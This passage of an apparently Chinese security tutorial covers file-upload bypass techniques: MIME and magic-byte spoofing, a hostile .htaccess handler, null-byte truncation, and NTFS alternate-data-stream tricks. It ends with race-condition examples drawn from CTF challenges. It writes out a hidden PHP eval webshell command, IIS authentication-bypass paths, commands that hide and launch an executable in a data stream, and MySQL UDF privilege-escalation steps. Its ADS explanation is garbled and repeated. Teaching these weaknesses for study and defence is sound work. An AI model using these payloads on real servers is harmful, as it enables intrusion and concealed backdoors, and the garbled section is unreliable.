        <td>.tar</td>
        <td>application/x-tar</td>
        <td>TAR文件</td>
    </tr>
    <tr>
        <td>.exe</td>
        <td>application/octet-stream</td>
        <td>下载文件类型</td>
    </tr>
    <tr>
        <td>.rmvb</td>
        <td>video/vnd.rn-realvideo</td>
        <td>在线播放</td>
    </tr>
    <tr>
        <td>.txt</td>
        <td>text/plain</td>
        <td>普通文本</td>
    </tr>
    <tr>
        <td>.mrp</td>
        <td>application/octet-stream</td>
        <td>MRP文件&#xff08;国内普遍的手机&#xff09;</td>
    </tr>
    <tr>
        <td>.ipa</td>
        <td>application/iphone-package-archive</td>
        <td>IPA文件(IPHONE)</td>
    </tr>
    <tr>
        <td>.deb</td>
        <td>application/x-debian-package-archive</td>
        <td>DED文件(IPHONE)</td>
    </tr>
    <tr>
        <td>.apk</td>
        <td>application/vnd.android.package-archive</td>
        <td>APK文件(安卓系统)</td>
    </tr>
    <tr>
        <td>.cab</td>
        <td>application/vnd.cab-com-archive</td>
        <td>CAB文件(Windows Mobile)</td>
    </tr>
    <tr>
        <td>.xap</td>
        <td>application/x-silverlight-app</td>
        <td>XAP文件(Windows Phone 7)</td>
    </tr>
    <tr>
        <td>.sis</td>
        <td>application/vnd.symbian.install-archive</td>
        <td>SIS文件(symbian平台)</td>
    </tr>
    <tr>
        <td>.jar</td>
        <td>application/java-archive</td>
        <td>JAR文件(JAVA平台手机通用格式)</td>
    </tr>
    <tr>
        <td>.jad</td>
        <td>text/vnd.sun.j2me.app-descriptor</td>
        <td>JAD文件(JAVA平台手机通用格式)</td>
    </tr>
    <tr>
        <td>.sisx</td>
        <td>application/vnd.symbian.epoc/x-sisx-app</td>
        <td>SISX文件(symbian平台)</td>
    </tr>
</table>

<h3 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application/php改为其他web程序允许的类型。</p>
<h2 id="文件头检查文件"><a href="#文件头检查文件" class="headerlink" title="文件头检查文件"></a>文件头检查文件</h2><p>原理:<br>利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p>
<h3 id="常见格式"><a href="#常见格式" class="headerlink" title="常见格式"></a>常见格式</h3><table>
    <tr>
        <th align="left">格式</th>
        <th align="left">文件头</th>
    </tr>
    <tr>
        <td align="left">TIFF (tif)</td>
        <td align="left">49492A00</td>
    </tr>
    <tr>
        <td align="left">Windows Bitmap (bmp)</td>
        <td align="left">424D</td>
    </tr>
    <tr>
        <td align="left">CAD (dwg)</td>
        <td align="left">41433130</td>
    </tr>
    <tr>
        <td align="left">Adobe Photoshop (psd)</td>
        <td align="left">38425053</td>
    </tr>
    <tr>
        <td align="left">JPEG (jpg)</td>
        <td align="left">FFD8FF</td>
    </tr>
    <tr>
        <td align="left">PNG (png)</td>
        <td align="left">89504E47</td>
    </tr>
    <tr>
        <td align="left">GIF (gif)</td>
        <td align="left">47494638</td>
    </tr>
    <tr>
        <td align="left">XML (xml)</td>
        <td align="left">3C3F786D6C</td>
    </tr>
    <tr>
        <td align="left">HTML (html)</td>
        <td align="left">68746D6C3E</td>
    </tr>
    <tr>
        <td align="left">MS Word/Excel (xls.or.doc)</td>
        <td align="left">D0CF11E0</td>
    </tr>
    <tr>
        <td align="left">MS Access (mdb)</td>
        <td align="left">5374616E64617264204A</td>
    </tr>
    <tr>
        <td align="left">ZIP Archive (zip)，</td>
        <td align="left">504B0304</td>
    </tr>
    <tr>
        <td align="left">RAR Archive (rar)，</td>
        <td align="left">52617221</td>
    </tr>
    <tr>
        <td align="left">Wave (wav)，</td>
        <td align="left">57415645</td>
    </tr>
    <tr>
        <td align="left">AVI (avi)，</td>
        <td align="left">41564920</td>
    </tr>
    <tr>
        <td align="left">Adobe Acrobat (pdf)，</td>
        <td align="left">255044462D312E</td>
    </tr>
</table>

<h3 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>
<h2 id="限制Web-Server对特定类型文件的行为-htaccess文件攻击"><a href="#限制Web-Server对特定类型文件的行为-htaccess文件攻击" class="headerlink" title="限制Web Server对特定类型文件的行为(.htaccess文件攻击)"></a>限制Web Server对特定类型文件的行为(.htaccess文件攻击)</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p>
<p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：</p>
<blockquote>
<p>在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此Apache使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对web server行为进行限制。<br>禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p>
</blockquote>
<p>指定特定扩展名的文件的处理方式,原理是指定Response的Content-Type可以加上如下几行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">AddType text/plain .pl .py .php</code></pre>

<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p>
<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p>
<p>如果要完全禁止特定扩展名的文件被访问，用下面的几行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Options -ExecCGI
AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</code></pre>

<p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误</p>
<p>强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$"</span><span class="token operator">></span>
ForceType text/plain
<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">></span></code></pre>

<p>只允许访问特定类型的文件.使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问(白名单策略)。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>Files ^<span class="token punctuation">(</span>*.jpeg<span class="token operator">|</span>*.jpg<span class="token operator">|</span>*.png<span class="token operator">|</span>*.gif<span class="token punctuation">)</span><span class="token operator">></span>
order deny,allow
deny from all
<span class="token operator">&lt;</span>/Files<span class="token operator">></span></code></pre>

<h3 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>
<p>补充知识htaccess：</p>
<blockquote>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<hr>
<p>这里还有一种</p>
<p>如果PHP安全没配置好就可以通过move_uploaded_file函数把自己写的.htaccess文件覆盖掉服务器上的,这样就能任意定义解析名单了。<br>来做个小实验，先描述下效果：</p>
<blockquote>
<p>通过一个.htaccess文件调用php的解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件，所以无论文件名是什么样子，只要包含”haha”这个字符串，都可以被以php的方式来解析，是不是相当邪恶，一个自定义的.htaccess文件就可以以各种各样的方式去绕过很多上传验证机制建一个.htaccess文件，里面的内容如下</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"haha"</span><span class="token operator">></span>
    SetHandler application/x-httpd-php
<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">></span>
</code></pre>
<h2 id="文件系统00截断"><a href="#文件系统00截断" class="headerlink" title="文件系统00截断"></a>文件系统00截断</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p><strong>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。</strong>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00、%00上传截断漏洞。</p>
<h3 id="绕过方法-5"><a href="#绕过方法-5" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>
<h2 id="7-windows-NTFS文件系统特性绕过"><a href="#7-windows-NTFS文件系统特性绕过" class="headerlink" title="7.windows NTFS文件系统特性绕过"></a>7.windows NTFS文件系统特性绕过</h2><p>NTFS交换数据流（alternate data streams简称ADS）是NTFS磁盘格式的新特性，见漏洞详细可查CVE-1999-0278。</p>
<p><img src="image006.png" loading="lazy"></p>
<p>一个完整的流的格式为：::<br>文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br>修改宿主文件的内容或流的内容，不会对彼此造成影响。<br>流类型总是以符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 ( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(DATA)，默认流名为空。<br>ADS可以省略流名，但不能省略流类型。<br>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流(I N D E X A L L O C A T I O N ) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为INDEX A LLOCATION)，流名默认为I30<br>当我们对一个在NTFS分区中的ASP文件发出包含D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。</p>
<h3 id="绕过方法-6"><a href="#绕过方法-6" class="headerlink" title="绕过方法"></a>绕过方法</h3><ol>
<li><p>IIS目录访问权限绕过：在IIS6.0+PHP、IIS7+asp、IIS7.5+php的环境下，如果目录是通过HTTP Basic来认证，假设网站根目录存在index.php文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/admin::<span class="token variable">$INDEX_ALLOCATION</span>/index.php
/admin:<span class="token variable">$i30</span><span class="token builtin class-name">:</span><span class="token variable">$INDEX_ALLOCATION</span>/index.asp</code></pre>
</li>
<li><p>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。</p>
</li>
</ol>
<table>
    <tr>
        <th>上传的文件名</th>
        <th>服务器表面现象</th>
        <th>生成的文件内容</th>
    </tr>
    <tr>
        <td>Test.php:a.jpg</td>
        <td>生成Test.php</td>
        <td>空</td>
    </tr>
    <tr>
        <td>Test.php::$DATA</td>
        <td>生成test.php</td>
        <td>&lt;?php phpinfo();?&gt;</td>
    </tr>
    <tr>
        <td>Test.php::$INDEX_ALLOCATION</td>
        <td>生成test.php文件夹</td>
        <td></td>
    </tr>
    <tr>
        <td>Test.php::$DATA\0.jpg</td>
        <td>生成0.jpg</td>
        <td>&lt;?php phpinfo();?&gt;</td>
    </tr>
    <tr>
        <td>Test.php::$DATA\aaa.jpg</td>
        <td>生成aaa.jpg</td>
        <td>&lt;?php phpinfo();?&gt;</td>
    </tr>
</table>

<pre class="language-txt" data-language="txt"><code class="language-txt">注意：
对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，
从而认为其宿主文件名为1.asp而将.jpg识别为流名。
通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。
然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。
原因是在PHP+IIS的环境下，&quot; 同义. &gt;同义? &lt;同义*</code></pre>

<ol start="3">
<li><p>隐藏webshell：</p>
<p>在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，命令如下：<br><code>echo ^&lt;?php @eval(request[cmd])?^ &gt;&gt; index.php:hidden.jpg</code><br>这样生成了一个不可见的shell hidden.jpg，type dir del命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</p>
</li>
<li><p>mysql中的udf提权:</p>
</li>
</ol>
<pre class="language-txt" data-language="txt"><code class="language-txt">如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。
而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。</code></pre>

<p>如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。<br>而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。</p>
<p>Mysql 5.0.67之前，DLL的导入目录是C:\windows\system32<br>从MySQL 5.1开始，要求目录必须是mysql目录下的lib\plugin\目录，而且mysql 5.1之后的常用安装版本是默认不存在lib\plugin目录的。</p>
<p>执行sql语句<br><code>show variables like &#39;%plugin%&#39;;</code></p>
<p>查看目录位置。<br>利用ADS依次创建lib、plugin目录</p>
<p><code>select &#39;xxx&#39; into outfile &#39;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#39;;</code></p>
<p>如果创建失败的话，执行</p>
<p><code>show variables like &#39;%secure%&#39;;</code><br>看看secure_file_priv的值：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">null表示限制mysqld不允许导入导出
当secure_file_priv的值为&#x2F;tmp&#x2F;，表示限制mysqld 的导入导出只能在&#x2F;tmp&#x2F;目录下
当secure_file_priv的值为空，表示不对mysqld的导入导出做限制</code></pre>

<ol start="5">
<li>隐藏exe文件</li>
</ol>
<p><code>type muma.txt test.txt:muma.exe</code></p>
<p>在xp中可以用start test.txt:muma.exe执行，但是win7以上这样执行会报错。win7及之后的系统的正确姿势如下：<br>创建一个符号链接文件test.exe，链接到寄生的交换数据流可执行文件test.txt:muma.exe上：mklink test.exe,test.txt:muma.exe，然后执行start test.exe /b即可<br>更新一个方法：<br><code>wmic process call create &quot;C:\ProjectCode\test\test:putty.exe&quot;</code></p>
<pre class="language-txt" data-language="txt"><code class="language-txt">在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。</code></pre>

<p>查看隐藏流文件</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">使用这两款小工具配合进行检测和清除寄生的交换数据流
https:&#x2F;&#x2F;pan.baidu.com&#x2F;share&#x2F;link?shareid&#x3D;134850&amp;uk&#x3D;1108295926
labs.exe检测，streams.exe进行清理。
还有一个叫做AlternateStreamView的工具也可以</code></pre>

<h2 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h2><p>感觉这个的知识点偏向文件格式分析(MISC)。在制作图片马的时候</p>
<p>往往是在图片后头附件一段php代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p>
<p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用winhex或者是010editor等在文件内进行修改即可。</p>
<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*-coding:utf-8-*-</span>
<span class="token keyword">import</span> threading

COUNT <span class="token operator">=</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">Run</span><span class="token punctuation">(</span>threads_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> COUNT
    read_value <span class="token operator">=</span> COUNT
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"COUNT in Thread-%s is %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>threads_name<span class="token punctuation">)</span><span class="token punctuation">,</span> read_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
    COUNT <span class="token operator">=</span> read_value <span class="token operator">+</span> <span class="token number">1</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Run<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finally, The COUNT is %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>COUNT<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment">#######################=====输出结果</span>
<span class="token comment">#部分结果为：</span>

        ……
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9989</span> <span class="token keyword">is</span> <span class="token number">9972</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9990</span> <span class="token keyword">is</span> <span class="token number">9973</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9991</span> <span class="token keyword">is</span> <span class="token number">9974</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9992</span> <span class="token keyword">is</span> <span class="token number">9975</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9993</span> <span class="token keyword">is</span> <span class="token number">9976</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9994</span> <span class="token keyword">is</span> <span class="token number">9977</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9995</span> <span class="token keyword">is</span> <span class="token number">9978</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9996</span> <span class="token keyword">is</span> <span class="token number">9979</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9997</span> <span class="token keyword">is</span> <span class="token number">9980</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9998</span> <span class="token keyword">is</span> <span class="token number">9981</span>
COUNT <span class="token keyword">in</span> Thread<span class="token operator">-</span><span class="token number">9999</span> <span class="token keyword">is</span> <span class="token number">9982</span>
Finally<span class="token punctuation">,</span> The COUNT <span class="token keyword">is</span> <span class="token number">9983</span>

Process finished <span class="token keyword">with</span> exit code <span class="token number">0</span>



</code></pre>

<p>按照我们的预想，结果应该都是10000，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p>
<p>这是什么原因呢？</p>
<p>原因就在于我们没有对变量COUNT做同步制约，导致可能Thread-7在读COUNT,还没来得及更改COUNT,Thread-8抢夺资源，也来读COUNT,并且将COUNT修改为它读的结果+1，由此出现非预期。</p>
<p>同样的，WEB应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p>
<h3 id="例一：金额提现"><a href="#例一：金额提现" class="headerlink" title="例一：金额提现"></a>例一：金额提现</h3><p>假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元</p>
<h3 id="例二：moctf里的一道题"><a href="#例二：moctf里的一道题" class="headerlink" title="例二：moctf里的一道题"></a>例二：moctf里的一道题</h3><p>打开网址后一直打开的是index2.php 修改为index.php后发现还是会跳转到index2 抓包修改index.php。</p>
<p><img src="image001.png" loading="lazy"></p>
<p>发现index.php是一个302网页，因此就可以看到这里存在的一个文件uploadsomething.php。</p>
<p><img src="image002.png" loading="lazy"></p>
<p>随便填写文件名下面写入代码，再进行提交。</p>
<p>访问后</p>
<p><img src="image003.png" loading="lazy"></p>
<p>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p>
<p>写入一个py文件一直发requests即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php"</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<p><img src="image004.png" loading="lazy"></p>
<h3 id="例三：XMAN-Easy-Gallery"><a href="#例三：XMAN-Easy-Gallery" class="headerlink" title="例三：XMAN-Easy Gallery"></a>例三：XMAN-Easy Gallery</h3><p>伪协议读取代码<br><code>http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$error</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$tmpName</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$size</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$type</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">!==</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$name1</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$name1</span><span class="token operator">!==</span><span class="token double-quoted-string string">".gif"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token variable">$name1</span><span class="token operator">!==</span><span class="token double-quoted-string string">".jpg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hehe"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">!==</span><span class="token double-quoted-string string">"image/jpeg"</span><span class="token operator">&amp;&amp;</span><span class="token variable">$type</span><span class="token operator">!==</span><span class="token double-quoted-string string">"image/gif"</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token function">mime_content_type</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$rootpath</span><span class="token operator">=</span><span class="token single-quoted-string string">'uploads/'</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">,</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script language='JavaScript'>alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script>"</span><span class="token punctuation">;</span>
                <span class="token keyword">exit</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
